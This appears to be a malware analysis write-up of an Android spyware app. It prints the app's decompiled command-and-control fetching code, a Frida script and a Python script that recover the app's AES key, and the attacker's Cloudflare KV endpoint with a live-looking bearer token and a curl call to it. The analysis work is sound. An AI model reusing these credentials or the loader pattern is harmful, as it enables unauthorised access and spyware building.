## Lets first analyse the activites and services present in the app using JADX. 

We see multiple activites and service and few stand very suspicious :

![images](images/susAct.png)

## Let's have a look at the permissions requested by the app in the Manifest file:

![images](images/manifestPerms.png)

This app requests an unusually large number of permissions, many of which are highly invasive and typical of spyware, banking trojans, or surveillance malware.

![images](images/susPerms.png)

1) The above permissions are very common in malwares to do the listed actions. 

2) Also there are below permissions which if may lead to potential frauds : 

![images](images/susPerms2.png)

## Now let's breakdown the MainActivity :

![images](images/ManifestMA.png)

```
private boolean areAllPermissionsGranted() {
        return fj.a(this, "android.permission.READ_CONTACTS") == 0 && fj.a(this, "android.permission.CALL_PHONE") == 0 && fj.a(this, "android.permission.READ_SMS") == 0 && fj.a(this, "android.permission.RECEIVE_SMS") == 0 && fj.a(this, "android.permission.SEND_SMS") == 0;
    }
```

- Makes sure that the above permissions are given before starting the app , if these permissions aren't given then the user cannot use the app (**THE USER IS FORCED TO TURN ON THE PERMISSIONS**)


- If we check the "usage" of the function, it is used in the method `requestPermissions`, which is called in the OnCreate method.

![image](images/permissionfuncUsage.png)
![image](images/OnCreate.png)

- If the permissions are all given , it calls another method `fetchAppConfiguration`.

Let's look into the fetchAppConfiguration method :

```
private void fetchAppConfiguration() {
        try {
            String address = deviceUtils.getAddress();
            String decrypt = AESEncrypt.decrypt(deviceUtils.readAssets("api.txt"), Decrypt.getSecretKey());
            final AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
            asyncHttpClient.addHeader("Content-Type", RequestParams.APPLICATION_JSON);
            asyncHttpClient.addHeader("Authorization", "Bearer " + decrypt);
            asyncHttpClient.get(address, new AsyncHttpResponseHandler() { // from class: com.errorforcode.netix.MainActivity.1
                @Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onFailure(int i, Header[] headerArr, byte[] bArr, Throwable th) {
                    Toast.makeText(MainActivity.this.context, "Fetch address error: " + i, 1).show();
                    MainActivity.this.finish();
                }

                @Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                    try {
                        String decrypt2 = AESEncrypt.decrypt(new String(bArr), Decrypt.getSecretKey());
                        MainActivity.database.setString(ClientCookie.DOMAIN_ATTR, decrypt2);
                        MainActivity.database.setString("icon", "Normal");
                        MainActivity.this.fetchConfiguration(asyncHttpClient, "https://" + decrypt2 + "/users/" + MainActivity.deviceUtils.readAssets("port.txt") + "/config");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
```
- This is a pretty suspicious function because of the following reasons :

![images](images/fakeURLget.png)

- If we go to the definition of the `deviceUtils.getAddress` definition : 

```
 public String getAddress() throws Exception {
        StringBuilder sb = new StringBuilder("https://");
        String decrypt = AESEncrypt.decrypt(readAssets("core.txt"), Decrypt.getSecretKey());
        String decrypt2 = AESEncrypt.decrypt(readAssets("acc.txt"), Decrypt.getSecretKey());
        String decrypt3 = AESEncrypt.decrypt(readAssets("ns.txt"), Decrypt.getSecretKey());
        sb.append(decrypt);
        sb.append("/client/v4/accounts/");
        sb.append(decrypt2);
        sb.append("/storage/kv/namespaces/");
        sb.append(decrypt3);
        sb.append("/values/test");
        return sb.toString();
    }
```
We see that the URL is being extracted from various files from the `assets` folder and then decrypted using a secret key. 

Let's try to find the URL: 

The contents in the :

- core.txt : Mn6J47+7OPh5Oev9UkTH5MgASX+WlZSOeIjODT0C5pXGF6iwsTh28tTdh74zqBWF
- acc.txt : 0p1SEi9/UkhuMhUGx+2aEvOJ+IioKHaw5nQNHqyo6hghj9+lE1EcLCS202UN40ZRqYyfOrbuIiyJ5cKVOdU79A==
- ns.tst : i8BzP5dpLusLyVaMQfyT9GT3JkMNNUJEYKEG9KYIkECid2rLn3PL+H1TGaNdHF406tjdEMBHTHLoiEr9zsParg==

Now, lets try to find the secret key : 

![image](images/keynative.png)

Below is the Frida Script to find the secret key from the native file (**libnetix.so**):

```
Java.perform(function () {
    const Decrypt = Java.use("com.errorforcode.netix.Utils.Encrypt.Decrypt");
    const nativeGetSecretKey = Module.findExportByName("libnetix.so", "Java_com_errorforcode_netix_Utils_Encrypt_Decrypt_getSecretKey");
    
    if (nativeGetSecretKey) {
        Interceptor.attach(nativeGetSecretKey, {
            onLeave: function (retval) {
                const env = Java.vm.getEnv();
                const key = env.getStringUtfChars(retval, null).readCString();
                console.log("\n[+] REAL SECRET KEY:", key, "\n");       
            }
        });
    } else {
        console.error("[-] Error: libnetix.so or getSecretKey() not found!");
    }
});
```

![image](images/secretKey.png)

`&hX2aJ7$SdfW8!zQ9uB1Yx4LmN$XvG8C` -> This is the secret key.

Once the key is found , we can decrypt the URL specified. he python script for the same is mentioned below.

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_aes(encrypted_data, key):
    encrypted_bytes = base64.b64decode(encrypted_data)
    key_bytes = key.encode('utf-8')
    iv = encrypted_bytes[:16]
    ciphertext = encrypted_bytes[16:]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    return decrypted.decode('utf-8')

key = "&hX2aJ7$SdfW8!zQ9uB1Yx4LmN$XvG8C"
core_enc = "Mn6J47+7OPh5Oev9UkTH5MgASX+WlZSOeIjODT0C5pXGF6iwsTh28tTdh74zqBWF"
acc_enc = "0p1SEi9/UkhuMhUGx+2aEvOJ+IioKHaw5nQNHqyo6hghj9+lE1EcLCS202UN40ZRqYyfOrbuIiyJ5cKVOdU79A=="
ns_enc = "i8BzP5dpLusLyVaMQfyT9GT3JkMNNUJEYKEG9KYIkECid2rLn3PL+H1TGaNdHF406tjdEMBHTHLoiEr9zsParg=="

try:
    core_decrypted = decrypt_aes(core_enc, key)
    acc_decrypted = decrypt_aes(acc_enc, key)
    ns_decrypted = decrypt_aes(ns_enc, key)
    url = f"https://{core_decrypted}/client/v4/accounts/{acc_decrypted}/storage/kv/namespaces/{ns_decrypted}/values/test"
    
    print("Decrypted Values:")
    print(f"core.txt: {core_decrypted}")
    print(f"acc.txt: {acc_decrypted}")
    print(f"ns.txt: {ns_decrypted}")
    print("\nConstructed URL:")
    print(url)

except Exception as e:
    print(f"Decryption failed: {str(e)}")
    print("Possible reasons:")
    print("- Incorrect key")
    print("- Different AES mode was used (e.g., ECB instead of CBC)")
    print("- Different padding scheme")
    print("- IV handling might be different in the original implementation")
```

The output url is :

**https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test**

- This is a very suspiious URL, which likely stores the stolen details. `/storage/kv/namespaces/` is Cloudflare's key-value storage API.
- Malware uses this to store stolen data persistently.

Let's go back to where we left in the MainActivity : 

`String decrypt = AESEncrypt.decrypt(deviceUtils.readAssets("api.txt"), Decrypt.getSecretKey());`

The `decrypt` variable can be found by using the same python script as above, as the same `key` is used for decryption.

api.txt - rP79AifBcvxyHj9gInpNur3vjnnyCMK52cuMHmMUBAW9jxDSTYTAUP1gPtcfb5auT2Bps11yF1/pHPw6Dpfp6w==

`decrypt - xRnT8VHZvt-dZbA3WDUk0IWPrr8yfu9CmpMWSjIF`

```
final AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
asyncHttpClient.addHeader("Content-Type", RequestParams.APPLICATION_JSON);
asyncHttpClient.addHeader("Authorization", "Bearer " + decrypt);
```

- In general, standard apps use `HttpURLConnection` or `OkHttpClient`, and Headers are typically minimal and well-documented.
- Here, there is use of a deprecated library which is known for security vulnerabilities, and is often used in malware due to its simple async handling.
- Here, the value of `decrypt` that we found out is used as the `Bearer Token`. Generally, these API tokens are properly OAuth-generated.
- There are also missing security headers in this : 
    - No `User-Agent` 
    - No `X-Requested-With`
    - No certificate pinning (**Man in the middle attacks is very much possible**)

```
@Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                    try {
                        String decrypt2 = AESEncrypt.decrypt(new String(bArr), Decrypt.getSecretKey());
                        MainActivity.database.setString(ClientCookie.DOMAIN_ATTR, decrypt2);
                        MainActivity.database.setString("icon", "Normal");
                        MainActivity.this.fetchConfiguration(asyncHttpClient, "https://" + decrypt2 + "/users/" + MainActivity.deviceUtils.readAssets("port.txt") + "/config");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
```
- now there is another URL which is trying to load, let's decode to see what URL this is.
- If we see the usage of the `OnSucess` method, it takes the output returned by the firsl URL and decrypts it , to save it in the vairable `decrypt2`.
- The domain of the url is saved in the app database, maybe so that the app remembers from when to execute the orders from even after phone restart.

Let's see what does `https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test` return : 

```
curl -X GET   "https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test"   -H "Authorization: Bearer xRnT8VHZvt-dZbA3WDUk0IWPrr8yfu9CmpMWSjIF"   -H "Content-Type: application/json"
```

And we successfully get an encrypted output : `oX2m51CiKpsKMG4pEqMbN+JscM3FsuWnohtXf9ClwDTC967Qe6hTQWduWEWGz4I1`

- This can be decrypted using the same python file that we used to decrypt the other, because the same key is used to decrypt everything. 
- Once the py file is run with this encrypted URL, we get the domain **www.goqbee.space**.
- port.txt -> `-1002254644684`

Now the new constructed URL would be: **https://www.goqbee.space/users/-1002254644684/config**

When we try to open the URL, we get something like this:

![images](images/goqbee.png)

- Let's try to decode the encrypted data of the json using the same python code ..... We get `{'webview': None, 'notification': False}`.
- This clearly shows that this is the main URL through which the attacker, sends commands for the app to steal. 
















